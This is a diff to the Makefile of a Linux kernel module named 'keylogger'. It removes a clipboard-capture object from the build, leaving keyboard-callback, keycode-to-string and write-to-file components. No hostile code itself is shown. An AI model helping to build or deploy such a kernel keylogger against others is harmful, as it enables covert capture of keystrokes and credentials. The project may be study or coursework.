@@ -1,7 +1,7 @@
 obj-m := keylogger.o
 
 # Lista fișierelor sursă pentru modul
-keylogger-objs := init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o clipboard.o
+keylogger-objs := init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o
 
 COMPILE_DIR := $(PWD)
 KDIR := /lib/modules/$(shell uname -r)/build
